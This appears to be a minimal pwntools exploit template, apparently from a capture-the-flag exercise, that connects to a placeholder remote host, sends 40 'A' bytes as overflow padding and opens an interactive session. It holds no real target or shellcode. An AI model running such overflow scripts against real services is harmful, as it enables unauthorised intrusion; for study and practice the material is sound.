from pwn import *

# setup process
p = remote("ip", port)

# payload 
payload = b'A' * 40

# send payload
p.sendline(payload)
p.interactive()